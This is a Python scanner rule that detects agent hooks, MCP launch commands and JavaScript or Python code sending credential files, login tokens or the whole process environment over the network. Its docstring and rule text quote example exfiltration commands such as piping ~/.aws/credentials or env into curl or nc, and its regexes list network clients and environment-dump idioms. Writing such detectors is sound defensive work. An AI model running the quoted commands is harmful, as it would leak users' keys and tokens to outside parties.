"""Credentials, or the whole environment, sent off the machine by one command or call.

``ST-COMBO-EXFIL`` notices that a component can read a credential somewhere and can reach the
network somewhere. This rule is the narrower, stronger case: a single construct does both.

* **A command an agent or editor runs on its own** (``skilltotal.autorun``: hooks, MCP server
  launch commands, status line and credential helpers, plugin monitors and language servers,
  frontmatter hooks) that reads a credential and hands it to a network client: ``curl -d
  @~/.ssh/id_rsa https://...``, ``cat ~/.aws/credentials | curl --data-binary @- ...``, ``env |
  nc host 80``, ``$(gh auth token)`` sent to a host that is not GitHub. The example on the MCP
  security best-practices page (a client configuration whose startup command is ``npx ... && curl
  -X POST -d @~/.ssh/id_rsa ...``) is exactly this. A credential handed to its own client is not
  sent anywhere (``ssh -i ~/.ssh/key``, ``--kubeconfig``, a container mount ``-v ~/.aws:...``), and
  a provider's token sent to that provider (``gh auth token`` to ``api.github.com``) is its use.
* **Code that passes the whole process environment into a network request**: ``fetch(url, {body:
  JSON.stringify(process.env)})``, ``requests.post(url, json=dict(os.environ))``, directly or
  through a variable. The environment is where a machine keeps its tokens (CI secrets, cloud keys,
  ``NPM_TOKEN``), and posting all of it is the first thing dependency-confusion and install-time
  stealers do. One named variable sent as a header is ordinary API use and is not matched, nor is
  the environment handed to a child process or written to a local file.

Detection patterns below are string literals and parsing; nothing here runs or sends anything.
"""

from __future__ import annotations

import ast
import re

from skilltotal.autorun import AutorunCommand, autorun_commands
from skilltotal.file_index import FileIndex, IndexedFile
from skilltotal.models import Capability, Evidence, Severity, ThreatClass
from skilltotal.scanners.base import (
    MAX_EVIDENCE_SCANNED,
    RuleSpec,
    Scanner,
    ScanResult,
    _finding_from_rule,
)
from skilltotal.scanners.sensitive_paths import _STRONG_PATHS

RULE_ID = "ST-SECRET-EXFIL"

# --- commands -------------------------------------------------------------------------------------
# The home directory written as a variable reads as `~`, so `$HOME/.npmrc` is `~/.npmrc`.
_HOME = re.compile(
    r"\$\{?HOME\}?|\$\{?USERPROFILE\}?|\$env:(?:HOME|USERPROFILE)\b|%USERPROFILE%|%HOMEPATH%",
    re.IGNORECASE,
)
# A program that sends data over the network, at the start of a command or a pipeline stage.
_NET_CLIENT = re.compile(
    r"(?:^|[\s;&|(`'\"])(?:sudo\s+)?(?:curl|wget|nc|ncat|netcat|socat|telnet|ftp|tftp|scp|sftp|"
    r"rsync|Invoke-WebRequest|Invoke-RestMethod|iwr|irm)(?=$|[\s;&|)`'\"])",
    re.IGNORECASE,
)
# The same from inline code (`node -e "..."`, `python -c "..."`, PowerShell).
_INLINE_NET = re.compile(
    r"\bfetch\s*\(|\bhttps?\.(?:request|get)\s*\(|\baxios\b|\bXMLHttpRequest\b|\burlopen\s*\(|"
    r"\brequests\.(?:post|put|patch|get)\s*\(|\bhttpx\.\w+\s*\(|Net\.WebClient|"
    r"\bUpload(?:String|File|Data)\s*\(|\bsendBeacon\s*\(",
    re.IGNORECASE,
)
# Commands that print a login token. Sent to that provider's own hosts, the token is being used.
_TOKEN_COMMANDS = (
    (re.compile(r"\bgh\s+auth\s+token\b"), ("github.com", "githubusercontent.com")),
    (re.compile(r"\bgcloud\s+auth\s+print-(?:access|identity)-token\b"),
     ("googleapis.com", "google.com")),
    (re.compile(r"\baz\s+account\s+get-access-token\b"),
     ("azure.com", "microsoft.com", "windows.net", "azure.net", "microsoftonline.com")),
    (re.compile(r"\bsecurity\s+find-(?:generic|internet)-password\b"), ()),
)
# The whole environment: `env` / `printenv` with no command after them, `/proc/self/environ`,
# PowerShell's `Env:` drive, and the same in inline code.
_ENV_DUMP = re.compile(
    r"(?:^|[\s;&|(`'\"])(?:printenv|env)\s*(?=$|[|;&)`'\">])"
    r"|/proc/(?:self|\d+)/environ\b"
    r"|\b(?:Get-ChildItem|gci|dir|ls)\s+env:"
    r"|\[(?:System\.)?Environment\]::GetEnvironmentVariables\(\s*\)"
    r"|JSON\.stringify\(\s*process\.env\s*\)"
    r"|\b(?:dict|str|repr)\(\s*os\.environ\s*\)",
    re.IGNORECASE,
)
# A credential handed to its own client, a container mount or a tool's config option: read
# locally to authenticate, not sent anywhere. Checked on the text of the command stage before
# the path (the shapes sensitive_paths also treats as not a read).
_HANDED_TO_CLIENT = re.compile(
    r"(?:(?<![\w-])-i\s*=?\s*|\bIdentityFile[=\s]+|--identity(?:-file)?[=\s]+|\bssh-add\s+|"
    r"\bssh-keygen\b[^|;&\n]*\s-f\s*|--kubeconfig[=\s]+|\bKUBECONFIG=|"
    r"\b(?:AWS_SHARED_CREDENTIALS_FILE|AWS_CONFIG_FILE|GOOGLE_APPLICATION_CREDENTIALS|"
    r"SSH_KEY(?:_PATH)?|GIT_SSH_KEY)=|(?<![\w-])-v\s+|--volume[=\s]+|"
    r"--mount[=\s]+\S*?(?:source|src)=|--(?:cert|key|cacert|capath|netrc-file)[=\s]+|"
    r"(?<![\w-])-E\s+|\b(?:mkdir|chmod|chown|test)\b[^|;&\n]*|\[\[?\s+-[efsr]\s+)"
    r"[\"']?[^\s\"'|;&]*$"
)
_STAGE_BREAK = re.compile(r"[;&|\n]|\$\(|`")
_URL_HOST = re.compile(r"https?://([^/\s\"'`:?#]+)", re.IGNORECASE)
# The instance-metadata address reads credentials only when asked for them; how that is sent on
# is a different question, left to the sensitive-path rule and the combination.
_METADATA = re.compile(r"169\.254\.169\.254")


_STAGE_WINDOW = 300


def _stage_before(text: str, at: int) -> str:
    """The text of the command stage (pipeline element, list element) up to offset ``at``, at
    most the last few hundred characters of it (bounded, so many paths stay linear)."""
    start = max(0, at - _STAGE_WINDOW)
    for m in _STAGE_BREAK.finditer(text, start, at):
        start = m.end()
    return text[start:at]


def _hosts(text: str) -> list[str]:
    return [m.group(1).lower() for m in _URL_HOST.finditer(text)]


def secret_upload(command: str, env: str = "") -> tuple[int, int] | None:
    """The span (in ``command``) of a credential, a token command or an environment dump that
    the same command sends with a network client, or None.

    ``env`` holds the values the command is started with: a credential path handed over through
    one is read by the command as well, but only ``command`` can run a network client.
    """
    text = _HOME.sub("~", command)
    if not (_NET_CLIENT.search(text) or _INLINE_NET.search(text)):
        return None
    for m in _STRONG_PATHS.finditer(text):
        if _METADATA.match(m.group(0)):
            continue
        if _HANDED_TO_CLIENT.search(_stage_before(text, m.start())):
            continue
        return _original_span(command, text, m.start(), m.end())
    if env and any(
        not _METADATA.match(m.group(0)) for m in _STRONG_PATHS.finditer(_HOME.sub("~", env))
    ):
        hit = _NET_CLIENT.search(text) or _INLINE_NET.search(text)
        return _original_span(command, text, hit.start(), hit.end()) if hit else None
    m = _ENV_DUMP.search(text)
    if m:
        return _original_span(command, text, m.start(), m.end())
    for pattern, own_hosts in _TOKEN_COMMANDS:
        m = pattern.search(text)
        if m is None:
            continue
        hosts = _hosts(text)
        if own_hosts and hosts and all(h.endswith(own_hosts) for h in hosts):
            continue  # the provider's token sent to the provider: that is how it is used
        return _original_span(command, text, m.start(), m.end())
    return None


def _original_span(original: str, normalized: str, start: int, end: int) -> tuple[int, int]:
    """Map a span of the home-normalized text back onto the original command (approximately:
    each replaced variable shortened the text before it)."""
    if original == normalized:
        return start, end
    shift = 0
    for m in _HOME.finditer(original):
        if m.start() - shift >= start:
            break
        shift += len(m.group(0)) - 1
    return start + shift, min(len(original), end + shift)


# --- code: the whole environment into a network request -------------------------------------------
_JS_SUFFIXES = (".js", ".mjs", ".cjs", ".jsx", ".ts", ".tsx", ".mts", ".cts")
# `process.env` itself, not one of its variables (`process.env.X`, `process.env["X"]`).
_JS_WHOLE_ENV = re.compile(r"(?<![\w$.])process\.env(?!\s*(?:\?\.|\.)\s*[\w$]|\s*\[|[\w$])")
# A name followed by a property read (`env.TOKEN`, `env?.TOKEN`, `env['TOKEN']`): one variable of
# an environment alias, not the environment. A method call (`payload.toString()`) still carries it.
_JS_MEMBER_READ = re.compile(r"\s*(?:(?:\?\.|\.)\s*[\w$]+(?![\w$])(?!\s*\()|(?:\?\.)?\s*\[)")
_JS_SINK = re.compile(
    r"(?<![\w$.])(?:fetch|axios(?:\.(?:post|put|patch|request|get))?|got(?:\.(?:post|put|patch))?|"
    r"needle|ky(?:\.(?:post|put|patch))?|superagent\.(?:post|put|patch)|"
    r"(?:https?|http2)\.(?:request|get)|request(?:\.(?:post|put|patch))?|\$\.(?:post|ajax)|"
    r"navigator\.sendBeacon|undici\.request|ofetch)\s*\("
)
# `.send(` / `.write(` / `.end(` on a request or socket the same file opens.
_JS_SEND = re.compile(r"\.(?:send|write|end)\s*\(")
_JS_OPENS_CHANNEL = re.compile(
    r"\b(?:https?|http2)\.request\s*\(|\bnet\.(?:connect|createConnection)\s*\(|"
    r"\btls\.connect\s*\(|\bnew\s+(?:XMLHttpRequest|WebSocket)\s*\(|\bdgram\.createSocket\s*\("
)
# A shell command run from JavaScript with a network client in it.
_JS_EXEC = re.compile(r"(?<![\w$.])(?:exec|execSync|spawn|spawnSync|execFile|execFileSync)\s*\(")
_SHELL_NET = re.compile(r"\b(?:curl|wget|nc|ncat)\b")
_JS_ASSIGN = re.compile(
    r"\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=(?![=>])"
    r"|(?<![\w$.])([A-Za-z_$][\w$]*)(?:\s*\.\s*[A-Za-z_$][\w$]*|\[[^\]\n]{0,80}\])*\s*=(?![=>])"
)
_LOCAL_URL = re.compile(
    r"""^\s*['"`]https?://(?:localhost|127\.\d+\.\d+\.\d+|\[::1\]|0\.0\.0\.0)(?:[:/'"`]|$)"""
)
_ARGS_LIMIT = 4000
# Bounds for a crafted file (a real one has a handful of each).
_MAX_ENV_USES = 200
_MAX_TAINTED = 50
_MAX_CALLS = 2000
_ASSIGN_WINDOW = 800
_CONTINUATION = set("=+-*/%,(?:&|[{.!<>")
_CONTINUES_LINE = _CONTINUATION | {")", "]", "}"}


def _code_offset(f: IndexedFile, offset: int) -> bool:
    """True for code: not a comment, and not a string unless inside the ``${...}`` of a
    template literal (a command built as a template with the environment interpolated)."""
    if f.in_c_comment(offset):
        return False
    if not f.in_c_string(offset):
        return True
    span = f.string_span_at(offset)
    if span is None or f.text[span[0]] != "`":
        return False
    return f.text.rfind("${", span[0], offset) > f.text.rfind("}", span[0], offset)


def _skip_string(text: str, i: int, stop: int) -> int:
    quote = text[i]
    k = i + 1
    while k < stop:
        ch = text[k]
        if ch == "\\":
            k += 2
            continue
        if ch == quote:
            return k + 1
        if ch == "\n" and quote != "`":
            return k
        k += 1
    return stop


def _call_args(text: str, open_at: int) -> int | None:
    """Offset of the ``)`` closing the call whose ``(`` is at ``open_at`` (bounded), or None."""
    depth, i = 0, open_at
    stop = min(len(text), open_at + _ARGS_LIMIT)
    while i < stop:
        ch = text[i]
        if ch in "'\"`":
            i = _skip_string(text, i, stop)
            continue
        if ch in "([{":
            depth += 1
        elif ch in ")]}":
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return None


def _same_statement(seg: str) -> bool:
    """True when nothing in ``seg`` (the text after an ``=``) ends the assignment's statement."""
    depth, i, n = 0, 0, len(seg)
    last = "="
    while i < n:
        ch = seg[i]
        if ch in "'\"`":
            i = _skip_string(seg, i, n)
            last = "x"
            continue
        if ch in "([{":
            depth += 1
        elif ch in ")]}":
            depth -= 1
            if depth < 0:
                return False
        elif ch == ";" and depth == 0:
            return False
        elif ch == "\n" and depth == 0:
            rest = seg[i + 1 :].lstrip()
            if last not in _CONTINUATION and rest and rest[0] not in _CONTINUES_LINE:
                return False
        if not ch.isspace():
            last = ch
        i += 1
    return True


def _assigned_name(text: str, pos: int) -> str | None:
    """The variable whose assignment statement holds offset ``pos``, if any."""
    start = max(0, pos - _ASSIGN_WINDOW)
    window = text[start:pos]
    last = None
    for m in _JS_ASSIGN.finditer(window):
        last = m
    if last is None or not _same_statement(window[last.end():]):
        return None
    return last.group(1) or last.group(2)


def _js_env_dumps(f: IndexedFile) -> list[Evidence]:
    text = f.text
    if "process.env" not in text:
        return []
    whole = [m.start() for m in _JS_WHOLE_ENV.finditer(text) if _code_offset(f, m.start())]
    if not whole:
        return []
    whole = whole[:_MAX_ENV_USES]
    tainted: set[str] = set()
    for pos in whole:
        name = _assigned_name(text, pos)
        if name:
            tainted.add(name)
    for _ in range(3):  # a payload built in a few steps (env -> object -> JSON -> base64)
        grown: set[str] = set()
        for name in tainted:
            uses = re.finditer(rf"(?<![\w$.]){re.escape(name)}(?![\w$])", text)
            for k, m in enumerate(uses):
                if k >= _MAX_ENV_USES:
                    break
                if not _code_offset(f, m.start()) or _JS_MEMBER_READ.match(text, m.end()):
                    continue
                other = _assigned_name(text, m.start())
                if other and other not in tainted and other != name:
                    grown.add(other)
            if len(tainted) + len(grown) >= _MAX_TAINTED:
                break
        if not grown:
            break
        tainted |= grown
    names = re.compile(
        rf"(?<![\w$.])(?:{'|'.join(re.escape(n) for n in sorted(tainted))})(?![\w$])"
    ) if tainted else None
    opens_channel = bool(_JS_OPENS_CHANNEL.search(text))

    def carries_env(start: int, end: int) -> bool:
        if any(start <= p < end for p in whole):
            return True
        if names is None:
            return False
        return any(
            _code_offset(f, m.start()) and not _JS_MEMBER_READ.match(text, m.end())
            for m in names.finditer(text, start, end)
        )

    found: list[Evidence] = []
    for pattern, needs_channel, needs_net_cmd in (
        (_JS_SINK, False, False), (_JS_SEND, True, False), (_JS_EXEC, False, True),
    ):
        if needs_channel and not opens_channel:
            continue
        for k, m in enumerate(pattern.finditer(text)):
            if k >= _MAX_CALLS:
                break
            if not _code_offset(f, m.start()):
                continue
            open_at = m.end() - 1
            close = _call_args(text, open_at)
            if close is None:
                continue
            args = text[open_at + 1 : close]
            if _LOCAL_URL.match(args):
                continue
            if needs_net_cmd and not _SHELL_NET.search(args):
                continue
            if carries_env(open_at + 1, close):
                found.append(f.evidence_for_span(m.start(), close + 1))
                if len(found) >= MAX_EVIDENCE_SCANNED:
                    return found
    return found


# Python: modules whose calls reach the network, and the calls/methods that send data.
_PY_NET_MODULES = frozenset(
    {"requests", "httpx", "aiohttp", "urllib3", "urllib", "http", "socket", "smtplib",
     "websocket", "websockets", "ftplib", "pycurl", "grequests", "treq"}
)
_PY_SEND_LEAVES = frozenset(
    {"get", "post", "put", "patch", "delete", "head", "options", "request", "urlopen",
     "Request", "stream", "send", "sendall", "sendto", "sendmail", "send_message"}
)
# Methods on an object the code made (a session, a connection, a socket): `.get` is left out,
# since on anything but a network module it is a dictionary read.
_PY_METHOD_SENDS = frozenset(
    {"post", "put", "patch", "request", "send", "sendall", "sendto", "sendmail", "send_message",
     "urlopen"}
)
# Uses of `os.environ` that read one variable, test for one, or change the environment.
_PY_ENV_MEMBER = frozenset(
    {"get", "setdefault", "pop", "keys", "__getitem__", "__contains__", "__setitem__", "update",
     "clear", "popitem"}
)


class _PyImports:
    def __init__(self, tree: ast.AST) -> None:
        self.modules: dict[str, str] = {}  # local name -> module path
        self.names: dict[str, str] = {}  # local name -> module.attr
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    local = alias.asname or alias.name.split(".")[0]
                    self.modules[local] = alias.name if alias.asname else local
            elif isinstance(node, ast.ImportFrom) and node.level == 0 and node.module:
                for alias in node.names:
                    self.names[alias.asname or alias.name] = f"{node.module}.{alias.name}"

    def dotted(self, node: ast.expr) -> str | None:
        if isinstance(node, ast.Name):
            if node.id in self.names:
                return self.names[node.id]
            return self.modules.get(node.id, node.id)
        if isinstance(node, ast.Attribute):
            base = self.dotted(node.value)
            return f"{base}.{node.attr}" if base else None
        return None

    def network(self) -> bool:
        heads = {m.split(".")[0] for m in self.modules.values()}
        heads |= {n.split(".")[0] for n in self.names.values()}
        return bool(heads & _PY_NET_MODULES)


def _py_is_environ(node: ast.expr, imports: _PyImports) -> bool:
    return imports.dotted(node) == "os.environ"


def _py_env_dumps(f: IndexedFile) -> list[Evidence]:
    if "environ" not in f.text:
        return []
    try:
        tree = ast.parse(f.text)
    except (SyntaxError, ValueError, RecursionError, MemoryError):
        return []
    imports = _PyImports(tree)
    if not imports.network():
        return []
    parents: dict[int, ast.AST] = {}
    for parent in ast.walk(tree):
        for child in ast.iter_child_nodes(parent):
            parents[id(child)] = parent

    def whole_environ(node: ast.AST) -> bool:
        if not isinstance(node, (ast.Name, ast.Attribute)) or not _py_is_environ(node, imports):
            return False
        parent = parents.get(id(node))
        if isinstance(parent, ast.Subscript) and parent.value is node:
            return False  # os.environ["X"]
        if isinstance(parent, ast.Attribute) and parent.attr in _PY_ENV_MEMBER:
            return False  # os.environ.get("X")
        if isinstance(parent, ast.Compare) and node in parent.comparators:
            return False  # "X" in os.environ
        return True

    env_nodes = {id(n) for n in ast.walk(tree) if whole_environ(n)}
    if not env_nodes:
        return []
    tainted: set[str] = set()

    def one_variable(node: ast.Name) -> bool:
        parent = parents.get(id(node))
        if isinstance(parent, ast.Subscript) and parent.value is node:
            return True  # env["X"] on a name assigned the environment
        return isinstance(parent, ast.Attribute) and parent.attr in _PY_ENV_MEMBER

    def carries(expr: ast.AST) -> bool:
        return any(
            id(n) in env_nodes
            or (isinstance(n, ast.Name) and n.id in tainted and not one_variable(n))
            for n in ast.walk(expr)
        )

    assignments = [
        n for n in ast.walk(tree) if isinstance(n, (ast.Assign, ast.AnnAssign, ast.AugAssign))
    ]
    for _ in range(4):
        grown = False
        for node in assignments:
            value = node.value
            if value is None or not carries(value):
                continue
            targets = node.targets if isinstance(node, ast.Assign) else [node.target]
            for target in targets:
                while isinstance(target, (ast.Subscript, ast.Attribute)):
                    target = target.value
                if isinstance(target, ast.Name) and target.id not in tainted:
                    tainted.add(target.id)
                    grown = True
        if not grown:
            break

    found: list[Evidence] = []
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call) or not isinstance(node.func, (ast.Name, ast.Attribute)):
            continue
        name = imports.dotted(node.func) or ""
        head, _, leaf = name.partition(".")
        leaf = name.rsplit(".", 1)[-1]
        module_send = head in _PY_NET_MODULES and leaf in _PY_SEND_LEAVES
        method_send = (
            isinstance(node.func, ast.Attribute) and node.func.attr in _PY_METHOD_SENDS
            and head not in imports.modules and head not in imports.names
        )
        if not (module_send or method_send):
            continue
        args = [*node.args, *(k.value for k in node.keywords)]
        if any(carries(a) for a in args):
            end = getattr(node, "end_lineno", None) or node.lineno
            found.append(f.evidence_for_lines(node.lineno, end))
            if len(found) >= MAX_EVIDENCE_SCANNED:
                break
    return found


class SecretExfilScanner(Scanner):
    name = "secret_exfil"
    rules = [
        RuleSpec(
            id=RULE_ID,
            category="exfiltration_path",
            severity=Severity.HIGH,
            title="Credentials or the whole environment sent off the machine",
            description=(
                "One command or call reads a credential and sends it over the network. Either a "
                "command an agent or editor runs on its own (a hook, an MCP server's launch "
                "command, a status line or credential helper, a plugin monitor) uploads a key or "
                "credential file, a login token or the environment (`curl -d @~/.ssh/id_rsa`, "
                "`env | curl --data-binary @-`), or code passes the whole process environment "
                "(`process.env`, `os.environ`) into an HTTP request. The environment holds the "
                "machine's tokens and keys, so either way they reach whoever runs the endpoint."
            ),
            recommendation=(
                "Do not install the component or open the project in an agent. Remove the "
                "command or call; if it already ran, rotate every credential the machine and its "
                "environment held."
            ),
            capability=Capability.NETWORK_EGRESS,
            threat_class=ThreatClass.MALICIOUS_INDICATOR,
        ),
    ]

    def scan(self, index: FileIndex) -> ScanResult:
        evidence: list[Evidence] = []
        by_path = {f.relpath: f for f in index.files}
        for command in autorun_commands(index).commands:
            if command.is_http:
                continue
            ev = _command_evidence(command)
            if ev is None:
                ev = _script_evidence(command, by_path)
            if ev is not None:
                evidence.append(ev)
        for f in index.select(suffixes=_JS_SUFFIXES):
            evidence.extend(_js_env_dumps(f))
            if len(evidence) >= MAX_EVIDENCE_SCANNED:
                break
        for f in index.select(suffixes=(".py", ".pyw")):
            evidence.extend(_py_env_dumps(f))
            if len(evidence) >= MAX_EVIDENCE_SCANNED:
                break
        if not evidence:
            return ScanResult()
        return ScanResult(findings=[_finding_from_rule(self.rules[0], evidence)])


def _command_evidence(command: AutorunCommand) -> Evidence | None:
    text = command.text
    env = " ".join(p.text for p in command.env)
    span = secret_upload(text, env)
    if span is None:
        return None
    return command.evidence(command.piece_at(span[0]))


_SCRIPT_TOKEN = re.compile(r"[\w.${}/\\-]{1,300}\.(?:sh|bash|zsh|ps1)\b")
_SHELL_SUFFIXES = (".sh", ".bash", ".zsh", ".ps1")


def _script_evidence(command: AutorunCommand, by_path: dict[str, IndexedFile]) -> Evidence | None:
    """A shell script the command runs, shipped in the component, that uploads a credential."""
    near = command.file.relpath.split("/")[:-1]
    folders = [""] + ["/".join(near[:k]) for k in range(len(near), 0, -1)]
    for token in _SCRIPT_TOKEN.findall(command.text):
        cleaned = re.sub(r"^(?:\$\{?\w+\}?[\"']?[/\\])+", "", token)
        cleaned = re.sub(r"^(?:\.[/\\])+", "", cleaned).replace("\\", "/").lstrip("/")
        for folder in folders:
            script = by_path.get(f"{folder}/{cleaned}" if folder else cleaned)
            if script is None or script.suffix not in _SHELL_SUFFIXES:
                continue
            for line_no in range(1, len(script.text.splitlines()) + 1):
                line = script.line_text(line_no)
                if line.lstrip().startswith("#"):
                    continue
                span = secret_upload(line)
                if span is not None:
                    return script.evidence_for_lines(line_no, line_no)
    return None
